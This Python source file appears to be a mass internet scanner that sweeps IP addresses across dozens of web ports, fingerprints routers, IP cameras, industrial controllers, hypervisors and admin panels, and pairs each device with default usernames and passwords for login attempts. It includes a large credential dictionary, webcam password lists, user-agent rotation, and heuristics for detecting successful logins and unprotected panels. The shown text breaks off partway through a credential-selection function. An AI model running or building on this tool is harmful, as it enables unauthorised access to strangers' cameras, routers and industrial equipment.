import ipaddress
import threading
import queue
import requests
import urllib3
import sys
import json
import re
import time
import argparse
import random
import bisect
import os
import tempfile
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
from difflib import SequenceMatcher

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_CREDS = {
    "admin:admin": "TP-Link / D-Link / many",
    "admin:password": "Generic",
    "admin:1234": "Generic",
    "admin:": "Generic (blank)",
    "root:root": "Linux / Unix-based",
    "root:admin": "Various",
    "admin:default": "Huawei / ZTE",
    "admin:12345": "Generic",
    "admin:admin123": "Generic",
    "admin:pass": "Generic",
    "admin:123456": "Generic",
    "support:support": "Netgear",
    "Admin:Admin": "Various",
    "Admin:1234": "Various",
    "user:user": "Generic",
    "ubnt:ubnt": "Ubiquiti",
    "root:default": "Asus / various",
    "cisco:cisco": "Cisco",
    "admin:changeme": "Various",
    "root:12345": "Generic",
    "admin:master": "Various",
    "admin:1111": "Generic",
    "admin:0000": "Generic",
    "admin:admin1": "Generic",
    "admin:password1": "Generic",
    "root:123456": "Generic",
    "guest:guest": "Generic",
    "admin:letmein": "Generic",
    "admin:12345678": "Generic",
    "Administrator:admin": "Windows-based",
    "root:toor": "Unix-based",
    "admin:system": "Various",
    "admin:Admin": "Various",
    "root:1234": "Generic",
    "root:password": "Generic",
    "admin:root": "Various",
    "root:changeme": "Various",
    "admin:secret": "Various",
    "admin:admin1234": "Generic",
    "root:admin123": "Generic",
    "user:1234": "Generic",
    "user:password": "Generic",
    "user:123456": "Generic",
    "guest:1234": "Generic",
    "guest:password": "Generic",
    "Administrator:1234": "Windows",
    "Administrator:password": "Windows",
    "admin:123": "Generic",
    "root:123": "Generic",
    "admin:1234567": "Generic",
    "root:1234567": "Generic",
    "admin:qwerty": "Generic",
    "root:qwerty": "Generic",
    "admin:test": "Generic",
    "root:test": "Generic",
    "pi:raspberry": "Raspberry Pi",
    "pi:admin": "Raspberry Pi",
    "oracle:oracle": "Oracle",
    "oracle:admin": "Oracle",
    "tomcat:tomcat": "Apache Tomcat",
    "tomcat:admin": "Apache Tomcat",
    "tomcat:manager": "Apache Tomcat",
    "jboss:jboss": "JBoss",
    "weblogic:weblogic": "Oracle WebLogic",
    "weblogic:admin": "Oracle WebLogic",
    "wildfly:wildfly": "WildFly",
    "postgres:postgres": "PostgreSQL",
    "mysql:mysql": "MySQL",
    "sa:sa": "MSSQL",
    "sa:password": "MSSQL",
    "sa:admin": "MSSQL",
    "sa:123456": "MSSQL",
    "sa:P@ssw0rd": "MSSQL",
    "root:sa": "MSSQL",
    "nagios:nagios": "Nagios",
    "nagios:admin": "Nagios",
    "nagios:password": "Nagios",
    "nagiosadmin:nagiosadmin": "Nagios",
    "zabbix:zabbix": "Zabbix",
    "admin:zabbix": "Zabbix",
    "prometheus:prometheus": "Prometheus",
    "grafana:grafana": "Grafana",
    "admin:grafana": "Grafana",
    "kibana:kibana": "Kibana",
    "elastic:elastic": "Elasticsearch",
    "jenkins:jenkins": "Jenkins",
    "admin:jenkins": "Jenkins",
    "admin:sonarqube": "SonarQube",
    "sonar:sonar": "SonarQube",
    "sonar:admin": "SonarQube",
    "admin:gitlab": "GitLab",
    "root:gitlab": "GitLab",
    "admin:jira": "Jira",
    "admin:confluence": "Confluence",
    "admin:bitbucket": "Bitbucket",
    "admin:artifactory": "Artifactory",
    "admin:nexus": "Nexus",
    "deploy:deploy": "Nexus",
    "admin:pfsense": "pfSense",
    "admin:opnsense": "OPNsense",
    "admin:vyos": "VyOS",
    "vyos:vyos": "VyOS",
    "admin:meraki": "Meraki",
    "admin:aruba": "Aruba",
    "admin:ruckus": "Ruckus",
    "super:spider": "Ruckus",
    "admin:extremenetworks": "Extreme Networks",
    "admin:fortinet": "Fortinet",
    "admin:fortigate": "FortiGate",
    "admin:sophos": "Sophos",
    "admin:sonicwall": "SonicWall",
    "admin:watchguard": "WatchGuard",
    "admin:barracuda": "Barracuda",
    "admin:checkpoint": "Check Point",
    "admin:paloadalto": "Palo Alto",
    "admin:panorama": "Palo Alto",
    "netscreen:netscreen": "Juniper",
    "admin:juniper": "Juniper",
    "root:juniper": "Juniper",
    "super:juniper": "Juniper",
    "admin:avaya": "Avaya",
    "root:avaya": "Avaya",
    "admin:3com": "3Com",
    "admin:hp": "HP / ProCurve",
    "admin:procurve": "HP / ProCurve",
    "admin:brocade": "Brocade",
    "admin:foundry": "Foundry",
    "admin:dell": "Dell",
    "root:dell": "Dell",
    "admin:ibm": "IBM",
    "admin:lenovo": "Lenovo",
    "admin:huawei": "Huawei",
    "root:huawei": "Huawei",
    "admin:zte": "ZTE",
    "root:zte": "ZTE",
    "admin:alcatel": "Alcatel",
    "admin:alcatellucent": "Alcatel-Lucent",
    "admin:nokia": "Nokia",
    "admin:siemens": "Siemens",
    "admin:epson": "Epson (Printer)",
    "admin:brother": "Brother (Printer)",
    "admin:hp": "HP (Printer)",
    "admin:canon": "Canon (Printer)",
    "admin:lexmark": "Lexmark (Printer)",
    "admin:ricoh": "Ricoh (Printer)",
    "admin:sharp": "Sharp (Printer)",
    "admin:kyocera": "Kyocera (Printer)",
    "admin:xerox": "Xerox (Printer)",
    "admin:panasonic": "Panasonic",
    "admin:samsung": "Samsung",
    "admin:lg": "LG",
    "admin:philips": "Philips",
    "admin:ge": "GE",
    "admin:honeywell": "Honeywell",
    "admin:bosch": "Bosch",
    "admin:schneider": "Schneider Electric",
    "admin:siemens": "Siemens",
    "admin:johnson": "Johnson Controls",
    "admin:beckhoff": "Beckhoff",
    "admin:rockwell": "Rockwell Automation",
    "admin:omron": "Omron",
    "admin:mitsubishi": "Mitsubishi",
    "admin:abb": "ABB",
    "admin:yokogawa": "Yokogawa",
    "admin:advantech": "Advantech",
    "admin:moxa": "Moxa",
    "admin:niagara": "Niagara (Tridium)",
    "admin:tridium": "Tridium",
    "admin:grandstream": "Grandstream",
    "admin:polycom": "Polycom",
    "admin:cisco": "Cisco (VoIP)",
    "admin:avaya": "Avaya (VoIP)",
    "admin:asterisk": "Asterisk",
    "admin:freepbx": "FreePBX",
    "admin:3cx": "3CX",
    "admin:elastix": "Elastix",
    "admin:yeastar": "Yeastar",
    "admin:minicms": "MiniCMS",
    "admin:netcam": "Network Camera",
    "admin:ipcam": "IP Camera",
    "admin:cam": "Camera",
    "admin:view": "Camera",
    "admin:admin": "Camera (OEM)",
    "root:anko": "Anko (Camera)",
    "admin:realtek": "Realtek",
    "admin:mediakom": "MediaKom",
    "admin:trendnet": "TRENDnet",
    "admin:levelone": "LevelOne",
    "admin:sweex": "Sweex",
    "admin:sitecom": "Sitecom",
    "admin:edimax": "Edimax",
    "admin:asus": "ASUS",
    "admin:zyxel": "Zyxel",
    "admin:tp-link": "TP-Link",
    "admin:d-link": "D-Link",
    "admin:tenda": "Tenda",
    "admin:totolink": "TOTOLINK",
    "admin:netis": "Netis",
    "admin:mercusys": "Mercusys",
    "admin:comfast": "COMFAST",
    "admin:openwrt": "OpenWrt",
    "admin:dd-wrt": "DD-WRT",
    "admin:tomato": "Tomato",
    "admin:gargoyle": "Gargoyle",
    "admin:untangle": "Untangle",
    "admin:smoothwall": "Smoothwall",
    "admin:ipfire": "IPFire",
    "admin:ipcop": "IPCop",
    "admin:clearos": "ClearOS",
    "admin:zentyal": "Zentyal",
    "admin:ubiquiti": "Ubiquiti",
    "ubnt:ubnt": "Ubiquiti",
    "admin:mikrotik": "MikroTik",
    "admin:routeros": "MikroTik RouterOS",
    "admin:routerboard": "MikroTik RouterBoard",
    "admin:teltonika": "Teltonika",
    "admin:peplink": "Peplink",
    "admin:cradlepoint": "Cradlepoint",
    "admin:inhand": "InHand",
    "admin:digi": "Digi",
    "admin:multitech": "MultiTech",
    "admin:redlion": "Red Lion",
    "admin:phoenix": "Phoenix Contact",
    "admin:wago": "WAGO",
    "admin:ifm": "ifm",
    "admin:banner": "Banner Engineering",
    "admin:omron": "Omron",
    "admin:keyence": "Keyence",
    "admin:allen-bradley": "Allen-Bradley",
    "admin:siemens": "Siemens PLC",
    "admin:schneider": "Schneider PLC",
    "admin:mitel": "Mitel",
    "admin:openvpn": "OpenVPN",
    "admin:openssh": "OpenSSH",
    "admin:webmin": "Webmin",
    "admin:phpmyadmin": "phpMyAdmin",
    "root:phpmyadmin": "phpMyAdmin",
    "admin:phpadmin": "phpMyAdmin",
    "admin:postgres": "PostgreSQL Admin",
    "admin:cloud": "Cloud Panel",
    "admin:cpanel": "cPanel",
    "admin:whm": "WHM",
    "admin:plesk": "Plesk",
    "admin:webuzo": "Webuzo",
    "admin:vesta": "VestaCP",
    "admin:cyberpanel": "CyberPanel",
    "admin:directadmin": "DirectAdmin",
    "admin:ispconfig": "ISPConfig",
    "admin:ajenti": "Ajenti",
    "admin:cockpit": "Cockpit",
    "admin:webmin": "Webmin",
    "admin:usermin": "Usermin",
    "admin:virtualmin": "Virtualmin",
    "admin:kloxo": "Kloxo",
    "admin:centos": "CentOS Web Panel",
    "admin:aaPanel": "aaPanel",
    "admin:xui": "X-UI",
    "admin:3x-ui": "3X-UI",
    "admin:sui": "S-UI",
    "admin:marzban": "Marzban",
    "admin:nginx": "NGINX Web UI",
    "admin:apache": "Apache Status",
    "admin:ts": "TS Panel",
    "admin:proxmox": "Proxmox VE",
    "root:proxmox": "Proxmox VE",
    "admin:vmware": "VMware",
    "root:vmware": "VMware",
    "admin:esxi": "VMware ESXi",
    "root:esxi": "VMware ESXi",
    "admin:vcenter": "vCenter",
    "admin:xenserver": "XenServer",
    "root:xenserver": "XenServer",
    "admin:xcp-ng": "XCP-ng",
    "admin:ovirt": "oVirt",
    "admin:rhev": "RHEV",
    "admin:hyperv": "Hyper-V",
    "admin:nutanix": "Nutanix",
    "admin:citrix": "Citrix",
    "root:citrix": "Citrix",
    "nsroot:nsroot": "Citrix NetScaler",
    "admin:kemp": "Kemp LoadMaster",
    "admin:f5": "F5 BigIP",
    "admin:f5networks": "F5 Networks",
    "admin:radware": "Radware",
    "admin:a10": "A10 Networks",
}

WEBCAM_CREDS = [
    ("admin", "admin", "WebcamXP / Camera"),
    ("admin", "1234", "IP Webcam"),
    ("admin", "12345", "Webcam"),
    ("admin", "ipcam", "IP Camera"),
    ("admin", "cam", "Camera / Webcam"),
    ("admin", "netcam", "Network Camera"),
    ("admin", "view", "Camera"),
    ("root", "anko", "Anko Webcam"),
    ("admin", "realtek", "Realtek Camera"),
    ("admin", "trendnet", "TRENDnet Camera"),
    ("admin", "levelone", "LevelOne Camera"),
    ("admin", "", "Webcam (blank)"),
    ("admin", "meinsmart", "Smart Webcam"),
    ("admin", "flir", "FLIR Camera"),
    ("admin", "admin123", "DVR / NVR"),
    ("admin", "666666", "DVR / NVR"),
    ("admin", "pass", "DVR / Webcam"),
    ("admin", "default", "Camera / Webcam"),
    ("admin", "admin1", "IP Camera"),
    ("admin", "password", "IP Camera"),
    ("admin", "123456", "IP Camera"),
    ("admin", "1111", "DVR / Camera"),
    ("admin", "0000", "DVR / Camera"),
    ("admin", "123", "Camera"),
    ("admin", "12345678", "Camera"),
    ("admin", "admin1234", "Camera"),
    ("admin", "master", "Camera"),
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
]

DEVICE_PATTERNS = [
    (re.compile(r"TP[- ]?Link", re.I), "TP-Link"),
    (re.compile(r"D[- ]?Link", re.I), "D-Link"),
    (re.compile(r"Netgear", re.I), "Netgear"),
    (re.compile(r"Linksys", re.I), "Linksys"),
    (re.compile(r"ASUS", re.I), "ASUS"),
    (re.compile(r"Belkin", re.I), "Belkin"),
    (re.compile(r"Huawei", re.I), "Huawei"),
    (re.compile(r"ZTE", re.I), "ZTE"),
    (re.compile(r"Ubiquiti|UniFi|airOS", re.I), "Ubiquiti"),
    (re.compile(r"MikroTik|RouterOS", re.I), "MikroTik"),
    (re.compile(r"Cisco|CISCO", re.I), "Cisco"),
    (re.compile(r"Meraki", re.I), "Meraki"),
    (re.compile(r"Xiaomi|MiWiFi", re.I), "Xiaomi"),
    (re.compile(r"Tenda", re.I), "Tenda"),
    (re.compile(r"Mercury", re.I), "Mercury"),
    (re.compile(r"TOTOLINK", re.I), "TOTOLINK"),
    (re.compile(r"H3C|HP.?3.?Com", re.I), "H3C"),
    (re.compile(r"Arris|Touchstone", re.I), "Arris"),
    (re.compile(r"Motorola", re.I), "Motorola"),
    (re.compile(r"AVM|FRITZ!Box|FRITZ", re.I), "AVM/Fritz!Box"),
    (re.compile(r"Technicolor", re.I), "Technicolor"),
    (re.compile(r"Zyxel|ZyXEL", re.I), "Zyxel"),
    (re.compile(r"Buffalo|BUFFALO", re.I), "Buffalo"),
    (re.compile(r"DD[- ]?WRT|dd-wrt", re.I), "DD-WRT"),
    (re.compile(r"OpenWrt|LEDE", re.I), "OpenWrt"),
    (re.compile(r"Tomato|Toastman|Shibby", re.I), "Tomato (custom FW)"),
    (re.compile(r"PfSense|pfSense|pfsense", re.I), "pfSense"),
    (re.compile(r"OPNsense|opnsense", re.I), "OPNsense"),
    (re.compile(r"Synology|DiskStation", re.I), "Synology"),
    (re.compile(r"QNAP|QNAP", re.I), "QNAP"),
    (re.compile(r"TrueNAS|FreeNAS|NAS4Free", re.I), "TrueNAS/FreeNAS"),
    (re.compile(r"Unraid", re.I), "Unraid"),
    (re.compile(r"Proxmox|pve", re.I), "Proxmox VE"),
    (re.compile(r"VMware|ESXi|vSphere|vCenter", re.I), "VMware"),
    (re.compile(r"XenServer|XCP-ng", re.I), "XenServer"),
    (re.compile(r"Hyper-V", re.I), "Hyper-V"),
    (re.compile(r"Citrix|NetScaler", re.I), "Citrix"),
    (re.compile(r"Dahua", re.I), "Dahua (Camera)"),
    (re.compile(r"Hikvision|HIK", re.I), "Hikvision (Camera)"),
    (re.compile(r"Reolink", re.I), "Reolink (Camera)"),
    (re.compile(r"Amcrest", re.I), "Amcrest (Camera)"),
    (re.compile(r"Axis", re.I), "Axis (Camera)"),
    (re.compile(r"Bosch|BOSCH", re.I), "Bosch (Camera)"),
    (re.compile(r"Panasonic", re.I), "Panasonic"),
    (re.compile(r"Samsung", re.I), "Samsung"),
    (re.compile(r"LG", re.I), "LG"),
    (re.compile(r"Honeywell", re.I), "Honeywell"),
    (re.compile(r"Schneider|APC|AP9617|AP9618|AP9619", re.I), "Schneider/APC"),
    (re.compile(r"Grandstream", re.I), "Grandstream"),
    (re.compile(r"Polycom|SoundPoint", re.I), "Polycom"),
    (re.compile(r"Asterisk|FreePBX|Elastix|Issabel", re.I), "Asterisk/PBX"),
    (re.compile(r"3CX", re.I), "3CX Phone System"),
    (re.compile(r"Yeastar", re.I), "Yeastar"),
    (re.compile(r"Fortinet|FortiGate|Forti", re.I), "Fortinet"),
    (re.compile(r"Sophos|UTM|XG", re.I), "Sophos"),
    (re.compile(r"SonicWALL", re.I), "SonicWALL"),
    (re.compile(r"WatchGuard|Firebox", re.I), "WatchGuard"),
    (re.compile(r"Check.?Point", re.I), "Check Point"),
    (re.compile(r"Palo.?Alto|PAN-OS", re.I), "Palo Alto"),
    (re.compile(r"Juniper|Junos|NetScreen", re.I), "Juniper"),
    (re.compile(r"F5|BigIP|BIG-IP", re.I), "F5 Networks"),
    (re.compile(r"Barracuda", re.I), "Barracuda"),
    (re.compile(r"Avaya", re.I), "Avaya"),
    (re.compile(r"Alcatel|Alcatel-Lucent", re.I), "Alcatel-Lucent"),
    (re.compile(r"Nokia", re.I), "Nokia"),
    (re.compile(r"Siemens", re.I), "Siemens"),
    (re.compile(r"Dell|PowerEdge|iDRAC|DRAC", re.I), "Dell"),
    (re.compile(r"HP|Hewlett.?Packard|iLO|ProCurve|Aruba", re.I), "HP / Aruba"),
    (re.compile(r"IBM|System x|BladeCenter", re.I), "IBM"),
    (re.compile(r"Lenovo|ThinkServer|ThinkSystem", re.I), "Lenovo"),
    (re.compile(r"Supermicro|Super.?Micro", re.I), "Supermicro"),
    (re.compile(r"Intel|Xeon", re.I), "Intel"),
    (re.compile(r"Brocade", re.I), "Brocade"),
    (re.compile(r"Extreme|Summit", re.I), "Extreme Networks"),
    (re.compile(r"Ruckus|ZoneDirector", re.I), "Ruckus"),
    (re.compile(r"Meru", re.I), "Meru Networks"),
    (re.compile(r"Aerohive", re.I), "Aerohive"),
    (re.compile(r"Moxa", re.I), "Moxa"),
    (re.compile(r"Advantech", re.I), "Advantech"),
    (re.compile(r"Sierra|AirLink", re.I), "Sierra Wireless"),
    (re.compile(r"Cradlepoint", re.I), "Cradlepoint"),
    (re.compile(r"Peplink|Pepwave", re.I), "Peplink"),
    (re.compile(r"Teltonika", re.I), "Teltonika"),
    (re.compile(r"Digi|DigiPort", re.I), "Digi"),
    (re.compile(r"MultiTech|Multi-Tech", re.I), "MultiTech"),
    (re.compile(r"Red.?Lion", re.I), "Red Lion"),
    (re.compile(r"Phoenix.?Contact", re.I), "Phoenix Contact"),
    (re.compile(r"WAGO", re.I), "WAGO"),
    (re.compile(r"Epson", re.I), "Epson (Printer)"),
    (re.compile(r"Brother", re.I), "Brother (Printer)"),
    (re.compile(r"Canon", re.I), "Canon (Printer)"),
    (re.compile(r"Lexmark", re.I), "Lexmark (Printer)"),
    (re.compile(r"Ricoh", re.I), "Ricoh (Printer)"),
    (re.compile(r"Xerox", re.I), "Xerox (Printer)"),
    (re.compile(r"Kyocera", re.I), "Kyocera (Printer)"),
    (re.compile(r"Sharp", re.I), "Sharp (Printer)"),
    (re.compile(r"OKI|OKIDATA", re.I), "OKI (Printer)"),
    (re.compile(r"Konica.?Minolta", re.I), "Konica Minolta"),
    (re.compile(r"Toshiba", re.I), "Toshiba"),
    (re.compile(r"Minio|MinIO", re.I), "MinIO"),
    (re.compile(r"Jenkins", re.I), "Jenkins"),
    (re.compile(r"Grafana", re.I), "Grafana"),
    (re.compile(r"Prometheus", re.I), "Prometheus"),
    (re.compile(r"Kibana", re.I), "Kibana"),
    (re.compile(r"Elasticsearch", re.I), "Elasticsearch"),
    (re.compile(r"Jupyter|jupyter", re.I), "Jupyter"),
    (re.compile(r"Nginx|nginx|NGINX", re.I), "Nginx"),
    (re.compile(r"Apache|httpd", re.I), "Apache"),
    (re.compile(r"Tomcat|tomcat|TomEE", re.I), "Apache Tomcat"),
    (re.compile(r"JBoss|WildFly|wildfly", re.I), "JBoss/WildFly"),
    (re.compile(r"Jetty", re.I), "Jetty"),
    (re.compile(r"IIS|Microsoft-IIS", re.I), "IIS (Windows)"),
    (re.compile(r"LiteSpeed|litespeed", re.I), "LiteSpeed"),
    (re.compile(r"Caddy|caddy", re.I), "Caddy"),
    (re.compile(r"Traefik|traefik", re.I), "Traefik"),
    (re.compile(r"HAProxy|haproxy", re.I), "HAProxy"),
    (re.compile(r"Squid|squid", re.I), "Squid Proxy"),
    (re.compile(r"Proxmox|proxmox", re.I), "Proxmox"),
    (re.compile(r"Webmin|webmin", re.I), "Webmin"),
    (re.compile(r"phpMyAdmin|phpmyadmin|phpMyAdmin", re.I), "phpMyAdmin"),
    (re.compile(r"cPanel|cpanel|WHM", re.I), "cPanel / WHM"),
    (re.compile(r"Plesk|plesk", re.I), "Plesk"),
    (re.compile(r"Drupal|drupal", re.I), "Drupal"),
    (re.compile(r"WordPress|wordpress|wp-", re.I), "WordPress"),
    (re.compile(r"Joomla|joomla", re.I), "Joomla"),
    (re.compile(r"phpBB|phpbb", re.I), "phpBB"),
    (re.compile(r"MediaWiki|mediawiki|wiki", re.I), "MediaWiki"),
    (re.compile(r"GitLab|gitlab", re.I), "GitLab"),
    (re.compile(r"Gitea|gitea", re.I), "Gitea"),
    (re.compile(r"SonarQube|sonarqube", re.I), "SonarQube"),
    (re.compile(r"Artifactory|artifactory", re.I), "JFrog Artifactory"),
    (re.compile(r"Nexus|nexus", re.I), "Sonatype Nexus"),
    (re.compile(r"Docker|docker", re.I), "Docker"),
    (re.compile(r"Portainer|portainer", re.I), "Portainer"),
    (re.compile(r"Kubernetes|kubernetes|k8s", re.I), "Kubernetes"),
    (re.compile(r"RabbitMQ|rabbitmq", re.I), "RabbitMQ"),
    (re.compile(r"Redis|redis", re.I), "Redis"),
    (re.compile(r"MongoDB|mongodb", re.I), "MongoDB"),
    (re.compile(r"Consul|consul", re.I), "Consul"),
    (re.compile(r"Nomad|nomad", re.I), "Nomad"),
    (re.compile(r"Vault|vault", re.I), "Vault"),
    (re.compile(r"Home.?Assistant|homeassistant", re.I), "Home Assistant"),
    (re.compile(r"OpenHAB|openhab", re.I), "openHAB"),
    (re.compile(r"Domoticz|domoticz", re.I), "Domoticz"),
    (re.compile(r"Node-RED|node-red", re.I), "Node-RED"),
    (re.compile(r"Motion|motion", re.I), "Motion (Camera)"),
    (re.compile(r"ZoneMinder|zoneminder", re.I), "ZoneMinder"),
    (re.compile(r"Blue.?Iris|blueiris", re.I), "Blue Iris"),
    (re.compile(r"Milestone|milestone", re.I), "Milestone"),
    (re.compile(r"Exacq|exacq", re.I), "ExacqVision"),
    (re.compile(r"Genetec|genetec", re.I), "Genetec"),
    (re.compile(r"IC Realtime|icrealtime", re.I), "IC Realtime"),
    (re.compile(r"Lorex|lorex", re.I), "Lorex"),
    (re.compile(r"Swann|swann", re.I), "Swann"),
    (re.compile(r"Amcrest|amcrest", re.I), "Amcrest"),
    (re.compile(r"WebcamXP|webcamxp", re.I), "WebcamXP"),
    (re.compile(r"Yawcam|yawcam", re.I), "Yawcam"),
    (re.compile(r"IP.?Webcam|ipwebcam|IPWebcam", re.I), "IP Webcam"),
    (re.compile(r"mjpg.?streamer|mjpg-streamer|MJPEG", re.I), "MJPG-Streamer"),
    (re.compile(r"ContaCam|contacam", re.I), "ContaCam"),
    (re.compile(r"iSpy|ispy", re.I), "iSpy"),
    (re.compile(r"Xeoma|xeoma", re.I), "Xeoma"),
    (re.compile(r"Sighthound|sighthound", re.I), "Sighthound"),
    (re.compile(r"Security.?Spy|securityspy", re.I), "SecuritySpy"),
    (re.compile(r"RTSP|rtsp", re.I), "RTSP Stream"),
    (re.compile(r"ONVIF|onvif", re.I), "ONVIF Camera"),
    (re.compile(r"Foscam|foscam", re.I), "Foscam"),
    (re.compile(r"Wanscam|wanscam", re.I), "Wanscam"),
    (re.compile(r"Tenvis|tenvis", re.I), "Tenvis"),
    (re.compile(r"AVTECH|avtech", re.I), "AVTECH"),
    (re.compile(r"Novo|novo", re.I), "Novo Camera"),
    (re.compile(r"Camly|Camly|camly", re.I), "Camly"),
]

SCAN_PORTS = [80, 443, 8080, 8443, 5000, 3000, 81, 88, 8081, 8888, 8000, 8008]
WEBCAM_PORTS = [554, 8554, 8081, 8899, 9000, 7071, 7001, 82, 83, 85, 86, 87, 89]
ALL_PORTS = [80, 443, 8080, 8443, 5000, 3000, 81, 88, 8081, 8888, 8000, 8008, 9090, 9443, 4443, 10000, 9001, 9000, 8834, 4848, 7777, 5555, 1234, 2000, 2082, 2083, 2086, 2087, 2095, 2096, 6443, 7443, 7071, 8282, 8989, 18080, 18081, 28080, 28081, 49000, 49152, 49154, 554, 8554, 8081, 8899, 82, 83, 85, 86, 87, 89]

HTTPS_PORTS = {443, 8443, 9443, 4443, 6443, 7443, 2083, 2087, 2096, 8834, 9090}

session_cache = threading.local()
found_hits = threading.local()


def get_session():
    if not hasattr(session_cache, "session"):
        s = requests.Session()
        s.verify = False
        s.headers.update({"User-Agent": random.choice(USER_AGENTS)})
        adapter = requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=0)
        s.mount("http://", adapter)
        s.mount("https://", adapter)
        session_cache.session = s
    return session_cache.session


def try_http(ip, port):
    prefer_https = port in HTTPS_PORTS
    schemes = ("https", "http") if prefer_https else ("http", "https")
    for scheme in schemes:
        url = f"{scheme}://{ip}:{port}"
        try:
            s = get_session()
            r = s.get(url, timeout=(2, 6), allow_redirects=True)
            return r
        except requests.exceptions.SSLError:
            continue
        except requests.exceptions.ConnectTimeout:
            return None
        except requests.exceptions.ConnectionError:
            return None
        except requests.exceptions.ReadTimeout:
            return None
        except Exception:
            return None
    return None


LOGIN_KEYWORDS = [
    "login", "password", "sign in", "sign-in", "authenticate",
    "log in", "log-in", "credentials",
    "username", "type=\"password\"", "name=\"pass", "name=\"user",
    "input_password", "input_user", "mikrotik login",
    "routeros", "keep me logged in", "forgot password",
    "authorization required", "enter password",
]

# Stronger failure keywords — these are SPECIFIC error messages, not generic words
FAILURE_PHRASES = [
    "invalid password", "incorrect password", "wrong password",
    "invalid username", "incorrect username", "wrong username",
    "invalid credentials", "incorrect credentials",
    "authentication failed", "login failed", "access denied",
    "password does not match", "invalid login",
    "login incorrect", "bad password", "bad login",
    "username or password", "invalid user",
    "permission denied", "authorization failed",
    "wrong credentials",
    "failed to login", "sign in failed",
    "username and password", "user name and password",
    "authentification failed", "mot de passe incorrect",
    "invalid password", "verification failed",
]

SUCCESS_PHRASES = [
    "welcome", "logged in", "logged in as",
    "welcome back", "successfully", "last login",
    "logout", "sign out", "my account",
    "profile", "session started", "system status",
    "interface", "routing", "wireless", "administration",
    "configuration", "overview", "dashboard",
]

ERROR_CLASS_PATTERNS = re.compile(
    r'class=["\'][^"\']*(?:error|alert|danger|warning|fail|msg-err)[^"\']*["\']'
    r'|id=["\'][^"\']*(?:error|alert|danger|warning|fail)[^"\']*["\']'
    r'|(?:error|alert|fail)_message'
    r'|msg-error|err-msg',
    re.I
)

def has_login_form(body):
    body_lower = body.lower()[:10000]
    return any(x in body_lower for x in LOGIN_KEYWORDS)


DASHBOARD_KEYWORDS = [
    "dashboard", "welcome", "logout", "administration", "system status",
    "network", "overview", "management", "configuration",
    "settings", "admin panel", "control panel",
]


def has_dashboard_content(body):
    body_lower = body.lower()[:10000]
    return any(x in body_lower for x in DASHBOARD_KEYWORDS)


def has_dashboard_content_int(body):
    bl = (body or "").lower()[:10000]
    return sum(1 for x in DASHBOARD_KEYWORDS if x in bl)


def extract_title(body):
    m = re.search(r"<title>(.*?)</title>", body or "", re.I | re.S)
    return m.group(1).strip() if m else ""


def extract_form_fields(body):
    if not body:
        return None
    pw = len(re.findall(r'<input[^>]*type=["\']?password["\']?', body, re.I))
    inp = len(re.findall(r'<input', body, re.I))
    btn = len(re.findall(r'<button', body, re.I))
    return {"password_count": pw, "input_count": inp, "button_count": btn}


def count_failure_phrases(body):
    bl = body.lower()[:5000]
    return sum(1 for p in FAILURE_PHRASES if p in bl)


def has_error_banner(body):
    return bool(ERROR_CLASS_PATTERNS.search(body or ""))


def body_has_success_phrases(body):
    bl = body.lower()[:5000]
    return sum(1 for s in SUCCESS_PHRASES if s in bl)


LOGIN_ERROR_KEYWORDS = []
def is_login_failure(body):
    return False


AUTH_REALM_BLACKLIST = [
    "Login Required",
    "Authentication Required",
    "Access Denied",
    "Protected Area",
]


def identify_device(r):
    server = r.headers.get("Server", "")
    www_auth = r.headers.get("WWW-Authenticate", "")
    body = r.text[:10000] if r.text else ""
    title_match = re.search(r"<title>(.*?)</title>", body, re.I | re.S)
    title = title_match.group(1).strip() if title_match else ""

    for pattern, name in DEVICE_PATTERNS:
        if server and pattern.search(server):
            return name
        if www_auth and pattern.search(www_auth):
            return name
        if title and pattern.search(title):
            return name
        if body and pattern.search(body):
            return name

    if www_auth:
        realm_match = re.search(r'realm="?([^"]+)"?', www_auth)
        if realm_match:
            realm = realm_match.group(1)
            if realm and realm not in AUTH_REALM_BLACKLIST:
                return f"Auth Realm: {realm}"

    if server:
        short = server.split("/")[0].strip()
        if short:
            return f"HTTP ({short})"

    if title:
        clean = re.sub(r"<[^>]+>", "", title).strip()[:60]
        if clean:
            return f"Web ({clean})"

    content_type = r.headers.get("Content-Type", "")
    if "json" in content_type:
        return "API (JSON)"
    if "xml" in content_type:
        return "API (XML)"

    return "Unknown HTTP Service"


def check_no_auth(r):
    body_lower = r.text.lower()[:10000] if r.text else ""
    www_auth = r.headers.get("WWW-Authenticate", "")

    if www_auth and "basic" in www_auth.lower():
        return False
    if www_auth and "digest" in www_auth.lower():
        return False

    if has_login_form(body_lower):
        return False

    if r.status_code in (401, 403):
        return False

    return True


_device_creds_cache = None


def _build_device_creds_map():
    global _device_creds_cache
    if _device_creds_cache is not None:
        return _device_creds_cache
    mapping = {}
    for cred_string, categories in DEFAULT_CREDS.items():
        user, pw = cred_string.split(":", 1)
        normalized = categories.lower().replace("/", " ").replace(",", " ").replace("(", " ").replace(")", " ")
        keywords = set(normalized.split())
        for kw in keywords:
            if len(kw) <= 1:
                continue
            if kw in ("generic", "various", "many", "based", "blank"):
                continue
            mapping.setdefault(kw, []).append((user, pw, categories))
    _device_creds_cache = mapping
    return mapping


FALLBACK_CREDS = [
    ("admin", "admin", "Generic"),
    ("admin", "password", "Generic"),
    ("root", "root", "Generic"),
    ("admin", "", "Generic (blank)"),
    ("admin", "1234", "Generic"),
    ("admin", "12345", "Generic"),
]


def get_relevant_creds(device_type, max_creds=10):
    mapping = _build_device_creds_map()
    device_kws = set(re.findall(r'[a-zA-Z][a-zA-Z0-9]{2,}', device_type or ""))
    scored = {}
    for kw in device_kws:
        kwl = kw.lower()
        for map_kw, creds in mapping.items():
            if kwl == map_kw or kwl.startswith(map_kw) or map_kw.startswith(kwl):
                for entry in creds:
                    scored[entry] = scored.get(entry, 0) + 2
    if any(kw in ("webcam", "camera", "cam", "dvr", "nvr", "rtsp", "onvif", "mjpeg", "motion") for kw in device_kws):
        for entry in WEBCAM_CREDS:
